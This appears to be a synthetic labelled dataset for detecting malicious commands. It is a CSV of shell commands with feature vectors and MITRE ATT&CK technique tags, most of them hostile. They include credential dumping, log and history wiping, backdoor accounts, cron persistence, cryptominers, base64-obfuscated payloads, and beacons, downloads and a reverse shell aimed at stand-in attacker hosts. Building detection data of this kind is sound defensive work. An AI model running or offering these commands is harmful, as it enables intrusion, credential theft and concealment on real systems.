smbclient //10.0.0.5/C$ -U Administrator,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1021_Remote_Services'],synthetic
nohup find / -name '*.conf' -readable 2>/dev/null | head -20 &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.2, 0.44, 1, 0]",['T1083_File_and_Directory_Discovery'],synthetic
time echo 'bWFzc2NhbiAtcDEtNjU1MzUgMTAuMC4wLjAvMjQgLS1yYXRlPTEwMDAgOyBzbGVlcCAx' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1046_Network_Service_Scanning', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
time wmic useraccount list,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1087_Account_Discovery'],synthetic
mimikatz.exe 'sekurlsa::logonpasswords' exit,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1003_OS_Credential_Dumping'],synthetic
find /var/log -name '*.log' -exec truncate -s 0 {} \;,"[0, 0, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.4, 0, 0]",['T1070_Indicator_Removal'],synthetic
id | sleep 1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.2, 0.16, 1, 0]","['T1033_System_Owner_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
nmap  -A  -T4  192.168.1.0/24,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.16, 0, 0]",['T1046_Network_Service_Scanning'],synthetic
"perl -e 'eval pack q/H*/, q/7363726970742e6570732f52656d6f74652e706e67/' | echo done","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.2, 0.36, 1, 0]","['T1027_Obfuscated_Files_or_Information', 'T1059_Command_and_Scripting_Interpreter']",synthetic
unset HISTFILE; export HISTSIZE=0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1070_Indicator_Removal'],synthetic
secretsdump.py -just-dc-user Administrator domain/user:pass@DC && history -c,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.28, 1, 0]","['T1003_OS_Credential_Dumping', 'T1059_Command_and_Scripting_Interpreter']",synthetic
"bash -c ""pwd""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['BENIGN'],synthetic
echo 'bm1hcCAtc1YgLXAgMjIsODAsNDQzIDEwLjAuMC4wLzI0ICYmIGNobW9kICt4IC90bXAvcGF5bG9hZA==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1018_Remote_System_Discovery', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
wmic useraccount list ; history -c,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.24, 1, 0]","['T1087_Account_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo 'aGVsbG8=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
echo  'ZnBpbmcgLWEgLWcgMTkyLjE2OC4xLjAvMjQgMj4vZGV2L251bGwgJiYgc2xlZXAgMQ=='  |  base64  -d  |  bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1018_Remote_System_Discovery', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo 'c3NoIC1MIDgwODA6aW50ZXJuYWw6ODAgdXNlckBqdW1wLmhvc3Q=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1021_Remote_Services', 'T1027_Obfuscated_Files_or_Information']",synthetic
adduser --shell /bin/bash --disabled-password backdoor,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1136_Create_Account'],synthetic
curl -s http://c2.attacker.com/beacon ; history -c,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.24, 1, 0]","['T1041_Exfiltration_Over_C2_Channel', 'T1059_Command_and_Scripting_Interpreter']",synthetic
./pwnkit,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.04, 0, 1]",['T1068_Exploitation_for_Privilege_Escalation'],synthetic
echo  'd2dldCBodHRwOi8vYXR0YWNrZXIuY29tL3BheWxvYWQgLU8gL3RtcC9wYXlsb2FkICYmIGVjaG8gZG9uZQ=='  |  base64  -d  |  bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1105_Ingress_Tool_Transfer', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo 'aXAgbGluayBzaG93IHwgY2htb2QgK3ggL3RtcC9wYXlsb2Fk' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1016_System_Network_Config_Discovery', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
"bash -c ""psexec.py Administrator:password@10.0.0.5 cmd.exe""","[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1021_Remote_Services'],synthetic
cat /etc/hostname,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['BENIGN'],synthetic
ps aux | grep nginx,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.2, 0.2, 1, 0]",['BENIGN'],synthetic
echo 'Li9kaXJ0eWNvdyAvZXRjL3Bhc3N3ZCAncm9vdDo6MDowOnJvb3Q6L3Jvb3Q6L2Jpbi9iYXNoJyAmJiA+IC9kZXYvbnVsbCAyPiYx' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1068_Exploitation_for_Privilege_Escalation', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
useradd  -m  -s  /bin/bash  hacker  |  >  /dev/null  2>&1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.2, 0.36, 1, 0]","['T1136_Create_Account', 'T1059_Command_and_Scripting_Interpreter']",synthetic
time echo '*/5 * * * * curl http://c2.com/beacon' | crontab -,"[0, 1, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.48, 1, 0]",['T1053_Scheduled_Task'],synthetic
sudo echo 'bm9odXAgLi94bXJpZyAtLXVybCBzdHJhdHVtK3RjcDovL3Bvb2wubWluZXhtci5jb206NDQzIC0tdXNlciB3YWxsZXQgJg==' | base64 -d | bash,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1496_Resource_Hijacking', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo -e '\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
"php  -r  '$sock=fsockopen(""10.0.0.99"",4444);  ...'","[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1059_Command_and_Scripting_Interpreter'],synthetic
sed -i 's/old/new/g' config.cfg,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['BENIGN'],synthetic
nohup ./xmrig --url stratum+tcp://pool.minexmr.com:443 --user wallet &,"[0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1496_Resource_Hijacking'],synthetic
echo 'd21pYyB1c2VyYWNjb3VudCBsaXN0' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1087_Account_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
usermod  -aG  sudo  compromised_user,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1098_Account_Manipulation'],synthetic
echo 'Zm9yIHAgaW4gJChjYXQgcGFzc3dvcmRzLnR4dCk7IGRvIHNzaHBhc3MgLXAgJHAgc3NoIHJvb3RAMTAuMC4wLjEgaWQ7IGRvbmU=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1110_Brute_Force', 'T1027_Obfuscated_Files_or_Information']",synthetic
wmiexec.py  domain/admin:pass@10.0.0.5,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1021_Remote_Services'],synthetic
useradd -m -s /bin/bash hacker,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1136_Create_Account'],synthetic
wmiexec.py domain/admin:pass@10.0.0.5,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1021_Remote_Services'],synthetic
wget -q -O- --header='X-Auth: token123' http://evil.com/cmd | sleep 1,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.36, 1, 0]","['T1071_Application_Layer_Protocol', 'T1059_Command_and_Scripting_Interpreter']",synthetic
sudo echo 'R2V0LUxvY2FsR3JvdXBNZW1iZXIgLUdyb3VwIEFkbWluaXN0cmF0b3Jz' | base64 -d | bash,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1069_Permission_Groups_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /d C:\payload.exe ; history -c,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.4, 1, 0]","['T1112_Modify_Registry', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo 'd2dldCAtcSBodHRwOi8vbWluZXIuY29tL3htcmlnIC1PIC90bXAveG1yICYmIGNobW9kICt4IC90bXAveG1yICYmIC90bXAveG1yIC1vIHBvb2wubWluZXhtci5jb206NDQz' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1496_Resource_Hijacking', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo 'compromised ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1098_Account_Manipulation'],synthetic
cat ~/.aws/credentials,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1003_OS_Credential_Dumping'],synthetic
medusa -h 10.0.0.1 -u root -P /tmp/passwords.txt -M ssh ; > /dev/null 2>&1,"[1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0.0, 0.52, 1, 0]","['T1110_Brute_Force', 'T1059_Command_and_Scripting_Interpreter']",synthetic
"bash -c ""reg delete HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Defender ; echo done""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.4, 1, 0]","['T1112_Modify_Registry', 'T1059_Command_and_Scripting_Interpreter']",synthetic
wget http://attacker.com/payload -O /tmp/payload && sleep 1,"[0, 1, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 1, 0]","['T1105_Ingress_Tool_Transfer', 'T1059_Command_and_Scripting_Interpreter']",synthetic
sudo gcc exploit.c -o exploit && ./exploit,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 1, 0]",['T1068_Exploitation_for_Privilege_Escalation'],synthetic
time echo 'compromised ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers | history -c,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.2, 0.4, 1, 0]","['T1098_Account_Manipulation', 'T1059_Command_and_Scripting_Interpreter']",synthetic
psexec.py  Administrator:password@10.0.0.5  cmd.exe  |  echo  done,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 0]","['T1021_Remote_Services', 'T1059_Command_and_Scripting_Interpreter']",synthetic
sudo net user /add attacker P@ssw0rd | chmod +x /tmp/payload,"[0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.4, 1, 1]","['T1136_Create_Account', 'T1059_Command_and_Scripting_Interpreter']",synthetic
cat /etc/group,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1069_Permission_Groups_Discovery'],synthetic
cat /etc/passwd | awk -F: '$3 >= 1000',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 0]",['T1087_Account_Discovery'],synthetic
ip addr show,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['BENIGN'],synthetic
sudo echo 'ZmluZCAvIC13cml0YWJsZSAtdHlwZSBkIDI+L2Rldi9udWxs' | base64 -d | bash,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1083_File_and_Directory_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
last -n 10,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1033_System_Owner_Discovery'],synthetic
echo 'c3UgLXMgL2Jpbi9iYXNoIHd3dy1kYXRh' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1078_Valid_Accounts', 'T1027_Obfuscated_Files_or_Information']",synthetic
net user /domain,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1087_Account_Discovery'],synthetic
sudo echo 'Y3VybCAtQSAnTW96aWxsYS81LjAnIGh0dHA6Ly9jMi5hdHRhY2tlci5jb20vY2hlY2staW4=' | base64 -d | bash,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1071_Application_Layer_Protocol', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo 'ZWNobyAnQHJlYm9vdCAvdG1wL2JhY2tkb29yLnNoJyB8IGNyb250YWIgLQ==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1053_Scheduled_Task', 'T1027_Obfuscated_Files_or_Information']",synthetic
wmiexec.py domain/admin:pass@10.0.0.5,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1021_Remote_Services'],synthetic
groups $(whoami),"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1069_Permission_Groups_Discovery'],synthetic
ifconfig -a,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1016_System_Network_Config_Discovery'],synthetic
at now + 1 minute <<< '/tmp/payload',"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1053_Scheduled_Task'],synthetic
nohup New-ItemProperty -Path 'HKLM:\...' -Name Persist -Value 'C:\payload.exe' &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.36, 0, 0]",['T1112_Modify_Registry'],synthetic
ssh admin@localhost && chmod +x /tmp/payload,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 1, 1]","['T1078_Valid_Accounts', 'T1059_Command_and_Scripting_Interpreter']",synthetic
cat  /etc/os-release  &&  echo  done,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 1, 0]","['T1082_System_Information_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
$env:cmd  =  [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA'))  ;  chmod  +x  /tmp/payload,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0.0, 0.28, 1, 0]","['T1027_Obfuscated_Files_or_Information', 'T1059_Command_and_Scripting_Interpreter']",synthetic
nohup echo 'Y2F0IC9ldGMvZ3JvdXA=' | base64 -d | bash &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1069_Permission_Groups_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
nmap -A -T4 192.168.1.0/24,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.16, 0, 0]",['T1046_Network_Service_Scanning'],synthetic
net user /domain | > /dev/null 2>&1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.2, 0.28, 1, 0]","['T1087_Account_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
getent passwd | grep -v nologin,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 0]",['T1087_Account_Discovery'],synthetic
useradd  -m  -s  /bin/bash  -G  sudo  newadmin,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1098_Account_Manipulation'],synthetic
sudo  -u  www-data  bash  &&  history  -c,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 1, 0]","['T1078_Valid_Accounts', 'T1059_Command_and_Scripting_Interpreter']",synthetic
systemctl enable --now malicious.service ; > /dev/null 2>&1,"[0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.32, 1, 0]","['T1053_Scheduled_Task', 'T1059_Command_and_Scripting_Interpreter']",synthetic
time curl -s http://c2.attacker.com/beacon,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1041_Exfiltration_Over_C2_Channel'],synthetic
time nc -e /bin/bash attacker.com 80,"[0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1071_Application_Layer_Protocol'],synthetic
time find / -perm -4000 -type f 2>/dev/null,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.32, 0, 0]",['T1083_File_and_Directory_Discovery'],synthetic
find  /  -perm  -4000  -type  f  2>/dev/null,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.28, 0, 0]",['T1083_File_and_Directory_Discovery'],synthetic
"ldapsearch -x -b 'dc=domain,dc=com' '(objectClass=person)'","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1087_Account_Discovery'],synthetic
cat /proc/version ; > /dev/null 2>&1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.24, 1, 0]","['T1082_System_Information_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
ncrack -p 22 --user root -P pass.lst 10.0.0.1,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 0, 0]",['T1110_Brute_Force'],synthetic
echo 'cHNleGVjLnB5IEFkbWluaXN0cmF0b3I6cGFzc3dvcmRAMTAuMC4wLjUgY21kLmV4ZSB8ID4gL2Rldi9udWxsIDI+JjE=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1021_Remote_Services', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
ln  -s  /tmp/backdoor.sh  /etc/cron.d/system-update  |  history  -c,"[0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.28, 1, 0]","['T1053_Scheduled_Task', 'T1059_Command_and_Scripting_Interpreter']",synthetic
cat  /etc/passwd  |  awk  -F:  '$3  >=  1000',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 0]",['T1087_Account_Discovery'],synthetic
echo 'Zm9yIHAgaW4gJChjYXQgcGFzc3dvcmRzLnR4dCk7IGRvIHNzaHBhc3MgLXAgJHAgc3NoIHJvb3RAMTAuMC4wLjEgaWQ7IGRvbmU=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1110_Brute_Force', 'T1027_Obfuscated_Files_or_Information']",synthetic
sudo cat /proc/version && chmod +x /tmp/payload,"[0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 1, 1]","['T1082_System_Information_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
for  p  in  $(cat  passwords.txt);  do  sshpass  -p  $p  ssh  root@10.0.0.1  id;  done,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.52, 0, 0]",['T1110_Brute_Force'],synthetic
top  -bn1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['BENIGN'],synthetic
useradd  -m  -s  /bin/bash  -G  sudo  newadmin  |  >  /dev/null  2>&1,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.2, 0.44, 1, 0]","['T1098_Account_Manipulation', 'T1059_Command_and_Scripting_Interpreter']",synthetic
su -s /bin/bash www-data && > /dev/null 2>&1,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.32, 1, 0]","['T1078_Valid_Accounts', 'T1059_Command_and_Scripting_Interpreter']",synthetic
find /home -name '.env' 2>/dev/null && history -c,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 1, 0, 0, 0.0, 0.32, 1, 0]","['T1083_File_and_Directory_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo  'aWQgLXUgfCBzbGVlcCAx'  |  base64  -d  |  bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1033_System_Owner_Discovery', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
nohup echo 'bHNjcHUgJiYgc2xlZXAgMQ==' | base64 -d | bash &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1082_System_Information_Discovery', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo 'ZmluZCAvIC1uYW1lICcqLnBlbScgMj4vZGV2L251bGwgJiYgY2htb2QgK3ggL3RtcC9wYXlsb2Fk' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1003_OS_Credential_Dumping', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
"bash -c ""echo 'dXNlcmFkZCAtbyAtdSAwIC1nIDAgLU0gLWQgL3Jvb3QgLXMgL2Jpbi9iYXNoIGdob3N0' | base64 -d | bash""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1136_Create_Account', 'T1027_Obfuscated_Files_or_Information']",synthetic
nohup getent passwd | grep -v nologin &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 0]",['T1087_Account_Discovery'],synthetic
curl -A 'Mozilla/5.0' http://c2.attacker.com/check-in,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1071_Application_Layer_Protocol'],synthetic
nbtscan 192.168.1.0/24,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1018_Remote_System_Discovery'],synthetic
nmap --script=vuln 10.0.0.1,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.12, 0, 0]",['T1046_Network_Service_Scanning'],synthetic
cat /proc/version | > /dev/null 2>&1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.2, 0.24, 1, 0]","['T1082_System_Information_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo 'eGZyZWVyZHAgL3U6QWRtaW5pc3RyYXRvciAvcDpQYXNzd29yZDEyMyAvdjoxMC4wLjAuNQ==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1021_Remote_Services', 'T1027_Obfuscated_Files_or_Information']",synthetic
find / -perm -4000 -type f 2>/dev/null,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.28, 0, 0]",['T1083_File_and_Directory_Discovery'],synthetic
time echo '@reboot /tmp/.xmr/xmrig -o pool.minexmr.com' | crontab -,"[0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.36, 1, 0]",['T1496_Resource_Hijacking'],synthetic
python3  exploit.py  --target  localhost  &&  chmod  +x  /tmp/payload,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 1, 0]","['T1068_Exploitation_for_Privilege_Escalation', 'T1059_Command_and_Scripting_Interpreter']",synthetic
net user /add attacker P@ssw0rd,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1136_Create_Account'],synthetic
"bash -c ""groups $(whoami) ; history -c""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.28, 1, 0]","['T1069_Permission_Groups_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
nohup cat /etc/passwd | grep -v nologin &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 0]",['T1003_OS_Credential_Dumping'],synthetic
sudo groups $(whoami) && > /dev/null 2>&1,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.28, 1, 0]","['T1069_Permission_Groups_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
grep -r 'password' /var/www/html --include='*.php' | sleep 1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 0]","['T1003_OS_Credential_Dumping', 'T1059_Command_and_Scripting_Interpreter']",synthetic
passwd  -d  root,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1098_Account_Manipulation'],synthetic
